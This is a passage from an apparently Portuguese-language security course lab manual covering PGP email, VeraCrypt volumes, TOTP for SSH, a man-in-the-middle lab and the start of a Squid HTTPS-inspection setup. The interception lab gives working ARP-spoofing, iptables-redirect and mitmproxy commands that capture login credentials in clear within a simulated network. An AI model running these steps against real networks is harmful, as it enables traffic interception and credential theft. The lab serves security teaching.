<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada em sua máquina física.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Vamos agora testar o procedimento de criptografia assimétrica usado na atividade (2) em um cenário mais prático: no envio e recebimento de e-mails.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Crie uma conta de e-mail gratuita no serviço GMail, do Google.</p>
</li>
<li>
<p>Em sua máquina física, instale o programa <em>gpg4win</em> (que pode ser baixado em <a href="https://www.gpg4win.org/download.html" class="bare">https://www.gpg4win.org/download.html</a>). Durante a instalação, aceite todas as opções padrão, e desmarque a caixa <em>Executar Kleopatra</em> ao final do processo de instalação.</p>
</li>
<li>
<p>Em sua máquina física, instale o cliente de e-mail <em>Mozilla Thunderbird</em> (que pode ser baixado em <a href="https://www.thunderbird.net/pt-BR/thunderbird/all/" class="bare">https://www.thunderbird.net/pt-BR/thunderbird/all/</a>). Durante a instalação, aceite todas as opções padrão.</p>
</li>
<li>
<p>Ao abrir o Thunderbird, adicione a conta de e-mail criada no passo (1), como mostra a imagem a seguir:</p>
<div id="img-thunderbird-addaccount" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/thunderbird-addaccount.png" alt="thunderbird addaccount">
</div>
<div class="title">Figure 68. Adicionando uma conta de e-mail ao Thunderbird</div>
</div>
<div class="paragraph">
<p>Durante o processo de criação de conta, o <em>Thunderbird</em> irá abrir uma janela para autenticação no GMail, solicitando autorização para integração. Digite a senha da conta definida no passo (1) e garanta as permissões solicitadas.</p>
</div>
</li>
<li>
<p>No Thunderbird, navegue no menu localizado no canto superior direito. Clique em <em>Extensões</em> &gt; <em>Extensões</em>. No canto superior da janela, pesquise por <code>enigmail</code> e pressione ENTER. O primeiro resultado, a extensão <em>Enigmail</em>, é o que queremos: clique no botão <em>Adicionar ao Thunderbird</em> &gt; <em>Instalar agora</em>.</p>
<div class="paragraph">
<p>Após a instalação do <em>Enigmail</em>, reinicie o <em>Thunderbird</em> (feche e reabra o programa).</p>
</div>
</li>
<li>
<p>Desde a versão 2.0.0 do <code>Enigmail</code>, lançada em março de 2018, o modo padrão de operação é o <em>Enigmail/PeP</em>. O <em>PeP</em> (<em>pretty Easy privacy</em> cujo website é <a href="https://www.pep.security/" class="bare">https://www.pep.security/</a>) é uma implementação de segurança para e-mails com o objetivo expresso de ser simples e de baixa configuração. Para o nosso cenário, isso significa:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Geração automática de pares de chaves assimétricas</p>
</li>
<li>
<p>Distribuição automática de chaves públicas via anexo ou <em>upload</em> para servidores de chaves (<em>keyservers</em>)</p>
</li>
<li>
<p>Criptografia e assinatura automática de mensagens</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Vamos testar esses conceitos. Envie uma mensagem para o seu colega usando o Thunderbird. Caso o <em>Enigmail/PeP</em> esteja funcionando corretamente, o botão <em>Habilitar a Proteção</em> deverá estar marcado no centro da tela:</p>
<div id="img-thunderbird-pep1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/thunderbird-pep1.png" alt="thunderbird pep1">
</div>
<div class="title">Figure 69. PeP habilitado no Thunderbird</div>
</div>
<div class="paragraph">
<p>Logo abaixo, você visualizará o estado da privacidade como "Inseguro". Isso se deve ao fato de que você e seu colega ainda não fizeram a troca de chaves. O <em>Enigmail/PeP</em> irá se encarregar de anexar sua chave pública automaticamente à mensagem. Envie o email.</p>
</div>
</li>
<li>
<p>Na máquina do seu colega, a mensagem deverá ser recebida normalmente. Note que a mensagem está legível&#8201;&#8212;&#8201;não há criptografia ainda, apenas assinatura. Clique no triângulo amarelo na lateral direita para observas as características de confiança da mensagem:</p>
<div id="img-thunderbird-pep2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/thunderbird-pep2.png" alt="thunderbird pep2">
</div>
<div class="title">Figure 70. Mensagem segura, não confiável</div>
</div>
</li>
<li>
<p>Clique no botão <em>Negociação&#8230;&#8203;</em> para confirmar a veracidade da chave. Você verá a tela a seguir:</p>
<div id="img-thunderbird-pep3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/thunderbird-pep3.png" alt="thunderbird pep3">
</div>
<div class="title">Figure 71. Verificação de palavras confiáveis</div>
</div>
<div class="paragraph">
<p>Serão mostradas cinco palavras confiáveis, que devem ser confirmadas com o seu colega. Se corretas, significa que a chave pública anexada à mensagem original é, de fato, correspondente à chave privada sob posso do seu colega. Clique no botão <em>Confirme palavras-confiáveis</em> para autenticar a chave.</p>
</div>
</li>
<li>
<p>Logo após, você verá a tela a seguir:</p>
<div id="img-thunderbird-pep4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/thunderbird-pep4.png" alt="thunderbird pep4">
</div>
<div class="title">Figure 72. Mensagem segura e confiável</div>
</div>
<div class="paragraph">
<p>A partir desse momento, a chave pública do seu colega é conhecida pelo <em>Enigmail/PeP</em>, e é possível enviar mensagens criptografadas para ele e verificar mensagens assinadas. Envie um email-resposta para a mensagem original, e repita os passos (8) e (9) para autenticar a chave no sentido oposto. A partir desse momento, será possível trocar mensagens seguras entre as duas partes.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_criptografia_de_partições_e_volumes">4) Criptografia de partições e volumes</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada em sua máquina física.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale o <em>VeraCrypt</em> (que pode ser baixado em <a href="https://www.veracrypt.fr/en/Downloads.html" class="bare">https://www.veracrypt.fr/en/Downloads.html</a>) em sua máquina física. Durante a instalação, aceite todas as opções padrão.</p>
</li>
<li>
<p>O VeraCrypt pode criptografar partições inteiras ou apenas criar um contêiner seguro. Com isso, podemos gravar arquivos sigilosos no contêiner e transportá-lo através de mídia física ou meio não confiável de forma bastante conveniente. Na tela principal do VeraCrypt, clique em <em>Create Volume</em>.</p>
<div id="img-veracrypt1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/veracrypt1.png" alt="veracrypt1">
</div>
<div class="title">Figure 73. Criação de volumes no VeraCrypt, parte 1</div>
</div>
</li>
<li>
<p>Na tela seguinte, mantenha marcada a opção <em>Create an encrypted file container</em> e clique em <em>Next</em>.</p>
<div id="img-veracrypt2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/veracrypt2.png" alt="veracrypt2">
</div>
<div class="title">Figure 74. Criação de volumes no VeraCrypt, parte 2</div>
</div>
</li>
<li>
<p>Na tela subsequente, mantenha marcada a opção <em>Standard VeraCrypt volume</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Volume Location</em>, selecione uma pasta/arquivo destino para o contêiner e clique em <em>Next</em>.</p>
<div id="img-veracrypt3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/veracrypt3.png" alt="veracrypt3">
</div>
<div class="title">Figure 75. Criação de volumes no VeraCrypt, parte 3</div>
</div>
</li>
<li>
<p>Para as opções de criptografia, mantenha o algoritmo AES e hash SHA-512, e clique em <em>Next</em>.</p>
</li>
<li>
<p>Para o tamanho do volume, escolha 50MB, e clique em <em>Next</em>.</p>
</li>
<li>
<p>Para a senha do contêiner, é importante escolher uma senha forte que não seja facilmente descoberta. Para fins de teste, usaremos <code>rnpesr123</code>. Clique em <em>Next</em>.</p>
</li>
<li>
<p>Mantenha o <em>filesystem</em> em FAT, e mova o mouse para gerar entropia. Finalmente, clique em <em>Format</em>.</p>
</li>
<li>
<p>Para montar o volume, selecione uma letra vazia no seu sistema. A seguir, no quadro <em>Volume</em> da tela principal do VeraCrypt, clique em <em>Select File&#8230;&#8203;</em> e selecione o arquivo indicado no passo (5). Depois, clique em <em>Mount</em> e digite a senha informada no passo (8).</p>
<div id="img-veracrypt4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/veracrypt4.png" alt="veracrypt4">
</div>
<div class="title">Figure 76. Criação de volumes no VeraCrypt, parte 4</div>
</div>
</li>
<li>
<p>Pronto, o volume criptografado está montado. Basta escrever arquivos como desejado e, ao final do processo, clicar em <em>Dismount</em> na janela principal do VeraCrypt. Caso queira mover o volume criptografado para outro local, copie-o em um <em>pendrive</em>, mídia removível ou mesmo através da Internet, e remonte-o no local de destino.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_autenticação_usando_sistema_otp">5) Autenticação usando sistema OTP</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina <em>LinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade iremos instalar e configurar um sistema TOTP (<em>time-based one-time password</em>) usando a ferramenta <em>Google Authenticator</em> na máquina <em>LinServer-G</em>. Essa autenticação de duplo fator irá prover mais segurança durante logins SSH na máquina-alvo.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale <strong>em seu celular</strong> o aplicativo <em>Google Authenticator</em>:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Sistemas Android: <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en" class="bare">https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en</a></p>
</li>
<li>
<p>Sistemas Apple: <a href="https://itunes.apple.com/us/app/google-authenticator/id388497605?mt=8" class="bare">https://itunes.apple.com/us/app/google-authenticator/id388497605?mt=8</a></p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Para conseguir ler o <em>QR code</em> na tela, será necessário ter uma tela maior do que a console padrão do Virtualbox&#8201;&#8212;&#8201;faça login via <code>ssh</code> na máquina <em>LinServer-G</em> usando o PuTTY ou Cygwin e vire superusuário usando o comando <code>su</code>.</p>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ hostname
FBS-DESKTOP</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ ssh aluno@172.16.1.10
Password:
Last login: Thu Sep  6 09:31:40 2018 from 172.16.1.254
aluno@LinServer-A:~$</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>aluno@LinServer-A:~$ su -
Password:
root@LinServer-A:~#</pre>
</div>
</div>
</li>
<li>
<p>Instale o pacote que implementa suporte ao Google Authenticator na biblioteca PAM:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install libpam-google-authenticator</pre>
</div>
</div>
</li>
<li>
<p>Depois, insira a linha <code>auth  required  pam_google_authenticator.so</code> imediatamente após a linha 4, <code>@include common-auth</code>, no arquivo <code>/etc/pam.d/sshd</code>:</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/pam.d/sshd
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># head -n5 /etc/pam.d/sshd | grep -v '^#' | sed '/^$/d'
@include common-auth
auth  required  pam_google_authenticator.so</pre>
</div>
</div>
</li>
<li>
<p>Configure o <code>ssh</code> para permitir autenticação via <em>challenge-response</em>, alterando a diretiva <code>ChallengeResponseAuthentication</code> no arquivo <code>/etc/ssh/sshd_config</code> (linha 49). Feito isso, não esqueça de reiniciar o daemon do <code>ssh</code>.</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/ssh/sshd_config
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^ChallengeResponseAuthentication' /etc/ssh/sshd_config
ChallengeResponseAuthentication yes</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart ssh</pre>
</div>
</div>
</li>
<li>
<p>Agora, na máquina <em>LinServer-G</em>, execute <strong>como um usuário não-privilegiado</strong> (como o usuário <code>aluno</code>) o comando <code>google-authenticator</code>.</p>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 14. Opções do google-authenticator</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Pergunta</th>
<th class="tableblock halign-left valign-top">Opção</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Do you want authentication tokens to be time-based?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">y</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Do you want me to update your "/home/aluno/.google_authenticator" file?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">y</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Do you want to disallow multiple uses of the same authentication token?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">y</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Increase token window from default size of 1:30min to about 4min?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">y</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Do you want to enable rate-limiting?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">y</p></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Abra o aplicativo <em>Google Authenticator</em> em seu celular e clique no <code>+</code> vermelho no canto inferior direito da tela. Em seguida, clique em <em>Scan a barcode</em> e leia o <em>QR code</em> gerado no passo (6). Na tela principal, deverá surgir uma nova linha com seis dígitos (que serão re-gerados a cada 30s) e o identificador <code>aluno@LinServer-G</code>.</p>
</li>
<li>
<p>Verifique que a hora atual do servidor está correta. Como configuramos o NTP na sessão 4, é provável que esteja tudo correto, mas a <em>timezone</em> pode estar desconfigurada, como mostrado abaixo:</p>
<div class="literalblock">
<div class="content">
<pre>$ date
Thu Sep  6 09:40:05 EDT 2018</pre>
</div>
</div>
<div class="paragraph">
<p>Se esse for o caso, rode o comando <code>dpkg-reconfigure tzdata</code> como usuário <code>root</code>. Escolha <em>America</em> &gt; <em>Sao_Paulo</em> (ou outra <em>timezone</em>, se for esse o caso). Verifique que o relógio foi corrigido:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># dpkg-reconfigure tzdata

Current default time zone: 'America/Sao_Paulo'
Local time is now:      Thu Sep  6 10:42:27 BRT 2018.
Universal Time is now:  Thu Sep  6 13:42:27 UTC 2018.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># date
Thu Sep  6 10:42:36 BRT 2018</pre>
</div>
</div>
</li>
<li>
<p>Perfeito, tudo pronto. <strong>NÃO</strong> feche a sessão <code>ssh</code> atual, pois em caso de erros poderá ser necessário verificar alguns arquivos. Em lugar disso, abra uma nova sessão <code>ssh</code>, como usuário <code>aluno</code>, para a máquina <em>LinServer-G</em>. No <em>prompt</em> <em>Verification code</em>, informe o código temporizado indicado pelo aplicativo instalado em seu celular.</p>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ hostname
FBS-DESKTOP</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@FBS-DESKTOP ~
$ ssh aluno@172.16.1.10
Password:
Verification code:
You have mail.
Last login: Thu Sep  6 10:32:40 2018 from 172.16.1.254
aluno@LinServer-A:~$</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>aluno@LinServer-A:~$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>aluno@LinServer-A:~$ whoami
aluno</pre>
</div>
</div>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_7_redes_privadas_virtuais_e_inspeção_de_tráfego">Sessão 7: Redes privadas virtuais e inspeção de tráfego</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_interceptação_ofensiva_de_tráfego_https_com_o_mitmproxy">1) Interceptação ofensiva de tráfego HTTPS com o <strong><em>mitmproxy</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>KaliLinux-G</em> e <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Vamos usar a ferramenta <code>mitmproxy</code> para inspecionar conteúdo HTTPS na rede, através de um ataque <em>man-in-the-middle</em> usando a técnica de ARP <em>spoofing</em>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, mova a máquina <em>KaliLinux-G</em> para a Intranet alterando o nome da interface de rede <em>host-only</em> à que ela se encontra conectada no Virtualbox. Em seguida, altere seu endereço IP para algum que ainda não está sendo utilizado na rede, como 10.1.1.30, por exemplo. Teste a conectividade com as máquinas <em>FWGW1-G</em> e <em>WinClient-G</em> (desative o firewall do Windows na máquina <em>WinClient-G</em> para permitir a troca de pacotes ICMP).</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
address 10.1.1.30/24
gateway 10.1.1.1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s eth0 | grep '^ *inet '
    inet 10.1.1.30/24 brd 10.1.1.255 scope global eth0</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ping -c1 10.1.1.1
PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.
64 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=0.185 ms

--- 10.1.1.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.185/0.185/0.185/0.000 ms</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>root@kali:~# ping -c1 10.1.1.10
PING 10.1.1.10 (10.1.1.10) 56(84) bytes of data.
64 bytes from 10.1.1.10: icmp_seq=1 ttl=128 time=0.451 ms

--- 10.1.1.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
</div>
</div>
</li>
<li>
<p>Rode o comando <code>mitmproxy</code> uma vez, para que os certificados SSL sejam auto-gerados pelo programa. Assim que iniciado, saia do programa digitando <code>q</code>, e depois <code>y</code>.</p>
</li>
<li>
<p>Copie o certificado auto-gerado no passo (2) para a raiz do servidor web Apache instalado na máquina <em>KaliLinux-G</em>. Em seguida, renomeie o arquivo <code>index.html</code> e inicie o servidor web.</p>
<div class="literalblock">
<div class="content">
<pre># cp ~/.mitmproxy/mitmproxy-ca-cert.cer /var/www/html/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># mv /var/www/html/index.html /var/www/html/index.html.bak</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl start apache2</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>WinClient-G</em>, instale o navegador <em>Google Chrome</em>. O <em>Internet Explorer</em> padrão disponível no Windows 7 encontra-se um pouco defasado para lidar com websites HTTPS mais modernos. Em seguida, acesse o endereço IP da máquina <em>KaliLinux-G</em> e faça o download do arquivo <code>mitmproxy-ca-cert.cer</code>, como mostrado abaixo:</p>
<div id="img-mitmproxy-dlcert" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/mitmproxy-dlcert.png" alt="mitmproxy dlcert">
</div>
<div class="title">Figure 77. Download do certificado do mitmproxy</div>
</div>
</li>
<li>
<p>De posse do certificado, instale-o na máquina <em>WinClient-G</em>. Clique duas vezes sobre o certificado, e em seguida em <em>Abrir</em>. Na janela seguinte, clique em <em>Instalar Certificado&#8230;&#8203;</em>.</p>
<div id="img-mitmproxy-instcert1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/mitmproxy-instcert1.png" alt="mitmproxy instcert1">
</div>
<div class="title">Figure 78. Instalação do certificado do mitmproxy, parte 1</div>
</div>
<div class="paragraph">
<p>Clique em <em>Avançar</em>. Em seguida, marque a caixa <em>Colocar todos os certificados no repositório a seguir</em>, clique em <em>Procurar&#8230;&#8203;</em> e selecione <em>Autoridades de Certificação Raiz Confiáveis</em>.</p>
</div>
<div id="img-mitmproxy-instcert2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/mitmproxy-instcert2.png" alt="mitmproxy instcert2">
</div>
<div class="title">Figure 79. Instalação do certificado do mitmproxy, parte 2</div>
</div>
<div class="paragraph">
<p>Finalmente, clique em <em>Avançar</em> e em seguida em <em>Concluir</em>. Agora, o certificado do <code>mitmproxy</code> é reconhecido como um AC Raiz pelo sistema Windows. Num cenário real, o atacante teria que descobrir algum vetor de ataque <em>client-side</em> que permitisse a ele ter o acesso para copiar o certificado e instalá-lo na máquina da vítima. Aqui, como estamos em um ambiente simulado, pudemos contar com a "colaboração" do usuário-alvo.</p>
</div>
</li>
<li>
<p>De volta ao <em>KaliLinux-G</em>, pare o Apache. Em seguida, permita o repasse de pacotes no kernel, e redirecione o tráfego da vítima para o <code>mitmproxy</code>:</p>
<div class="literalblock">
<div class="content">
<pre># systemctl stop apache2</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># sysctl -w net.ipv4.ip_forward=1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80  -j REDIRECT --to-port 8080
# iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</pre>
</div>
</div>
</li>
<li>
<p>Agora sim, tudo pronto para efetivarmos o ataque. Abra duas abas lado-a-lado do terminal, logado como <code>root</code>. Na primeira, execute o ARP <em>spoofing</em> com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># arpspoof -i eth0 -r -t 10.1.1.10 10.1.1.1</pre>
</div>
</div>
<div class="paragraph">
<p>No segundo terminal, inicie o <code>mitmproxy</code> (em sua variante web) para iniciar o ataque <em>man-in-the-middle</em> contra a máquina <em>WinClient-G</em>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># mitmweb --mode transparent</pre>
</div>
</div>
<div class="paragraph">
<p>Depois de pouco tempo, será aberta uma janela do navegador para inspeção do tráfego.</p>
</div>
</li>
<li>
<p>Na máquina <em>WinClient-G</em>, abra o <em>Google Chrome</em> e navegue por websites HTTP e HTTPS. Note como o tráfego está sendo interceptado pelo <code>mitmproxy</code> e, no caso de conexões SSL, sendo mostrado em claro. Como um exemplo, fizemos um login no <a href="https://facebook.com" class="bare">https://facebook.com</a> com uma conta de teste&#8201;&#8212;&#8201;imediatamente, o usuário e senha são mostrados em claro na janela do <code>mitmweb</code>, na máquina <em>KaliLinux-G</em>:</p>
<div id="img-mitmproxy-password" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/mitmproxy-password.png" alt="mitmproxy password">
</div>
<div class="title">Figure 80. Credenciais em claro no mitmweb</div>
</div>
<div class="paragraph">
<p>Em parelelo, na janela do navegador na máquina <em>WinClient-G</em>, o login no Facebook é concluído com sucesso:</p>
</div>
<div id="img-mitmproxy-fblogin" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/mitmproxy-fblogin.png" alt="mitmproxy fblogin">
</div>
<div class="title">Figure 81. Login no facebook através do mitmproxy</div>
</div>
</li>
<li>
<p>Finalmente, retorne o ambiente de laboratório a seu estado original: pare o <code>mitmweb</code>, encerre o ARP <em>spoofing</em> e remova as regras de firewall criadas no passo (6).</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_inspeção_corporativa_de_tráfego_https_usando_o_squid">2) Inspeção corporativa de tráfego HTTPS usando o Squid</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Na atividade anterior, fizemos um ataque <em>man-in-the-middle</em> com o intuito de inspecionar tráfego HTTPS de uma vítima usando o <code>mitmproxy</code>, nos mesmos moldes que um atacante o faria no mundo real. Mas e se o objetivo for legítimo, como para inspecionar tráfego em uma rede corporativa?</p>
</div>
<div class="paragraph">
<p>Iremos utilizar a funcionalidade <em>SslBump Peek and Splice</em> (<a href="https://wiki.squid-cache.org/Features/SslPeekAndSplice" class="bare">https://wiki.squid-cache.org/Features/SslPeekAndSplice</a>) do Squid, disponível a partir da versão 3.5, para implementar um proxy HTTPS para os clientes da rede 10.1.G.0/24. Tendo em vista que a versão do Squid disponível nos repositórios do Debian 9 não está totalmente configurada para operar como um proxy SSL, iremos instalá-lo manualmente a partir do código-fonte.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>FWGW1-G</em>, instale as dependências de compilação:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get -y install build-essential libssl1.0-dev</pre>
</div>
</div>
</li>
<li>
<p>A seguir, faça o download do código-fonte do Squid, sua configuração, compilação e instalação através dos comandos que se seguem. O passo de compilação (<code>make</code>) pode demorar um pouco, seja paciente.</p>
<div class="literalblock">
<div class="content">
<pre># cd ~/src/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># wget http://www.squid-cache.org/Versions/v3/3.5/squid-3.5.28.tar.gz</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># tar zxf squid-3.5.28.tar.gz ; cd squid-3.5.28</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ./configure --prefix /usr/local --with-openssl=yes --enable-ssl-crtd --without-gnutls --enable-linux-netfilter</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># make</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># make install</pre>
</div>
</div>
</li>
<li>
<p>Feito isso, faremos a configuração inicial do Squid, incluindo criação de certificados para assinatura de conexões intermediárias, criação de usuários e permissionamento. Crie um arquivo novo, <code>/root/squidconfig.sh</code>, com o seguinte conteúdo:</p>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">#!/bin/bash

CONF_DIR="/usr/local/etc"
PRIVKEY="${CONF_DIR}/ssl/private.key"
PUBKEY="${CONF_DIR}/ssl/public.crt"
PEMFILE="${CONF_DIR}/ssl/proxy.pem"

mkdir ${CONF_DIR}/ssl
chmod 700 ${CONF_DIR}/ssl

openssl genrsa 4096 &gt; ${PRIVKEY}
openssl req -new -nodes -x509 -extensions v3_ca -days 365 -key ${PRIVKEY} -subj "/C=BR/ST=DF/L=Brasilia/O=RNP/OU=ESR/CN=fwgw1-a.esr.rnp.br" -out ${PUBKEY}
cat ${PUBKEY} ${PRIVKEY} &gt; ${PEMFILE}

mkdir /usr/local/var/lib
/usr/local/libexec/ssl_crtd -c -s /usr/local/var/lib/ssl_db

groupadd -r squid
useradd -g squid -r squid
chown squid:squid /usr/local/var/logs
chown squid:squid ${CONF_DIR}/ssl</code></pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, execute-o com:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># bash ~/squidconfig.sh</pre>
</div>
</div>
</li>
<li>
<p>O próximo passo é editar o arquivo de configuração do Squid, <code>/usr/local/etc/squid.conf</code>. O excerto abaixo mostra uma configuração válida para um proxy HTTP/HTTPS transparente que executa <em>bumping</em> (ou seja, as inspeciona via técnica <em>man-in-the-middle</em>) em todas as conexões, exceto para os domínios que constam no arquivo <code>/usr/local/etc/whitelist.txt</code>, para os quais o proxy irá fazer <em>splicing</em> (i.e., as conexões não serão inspecionadas pelo proxy, mas sim repassadas diretamente ao destino final).</p>
<div class="paragraph">
<p>O método de <em>bump</em> seletivo implementado como descrito acima é feito através da observação do campo <code>SSL::server_name</code> enviado pelo cliente durante o processo de <em>handshake</em> TLS. Nesse campo o cliente indica a qual <em>hostname</em> ele deseja se conectar, uma extensão ao protocolo TLS denominada <em>Server Name Indication</em> (SNI). Isso permite a um servidor apresentar múltiplos certificados em um mesmo endereço IP, respondendo por vários sites HTTPS diferentes. É, em essência, um conceito análogo ao <em>name-based virtual hosting</em> do HTTP/1.1, mas para o protocolo HTTPS.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash"># user/group to run proxy as
cache_effective_user squid
cache_effective_group squid

# local networks to proxy
acl localnet src 10.1.1.0/24

# default ACLs
acl Safe_ports port 21
acl Safe_ports port 80
acl Safe_ports port 443
acl Safe_ports port 1025-65535
acl SSL_ports port 443
acl CONNECT method CONNECT

# SSL ACLs
acl step1 at_step SslBump1
acl step2 at_step SslBump2
acl noBumpSites ssl::server_name "/usr/local/etc/whitelist.txt"

# peek @ client TLS request to find SNI
ssl_bump peek step1 all

# splice connections to servers matching whitelist
ssl_bump splice noBumpSites

# bump all other connections
ssl_bump bump

# default http_access block
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports

http_access allow localnet
http_access allow localhost

http_access deny all

# listen on ports 8080/HTTP and 8443/HTTPS, both as transparent proxy
http_port 8080 intercept
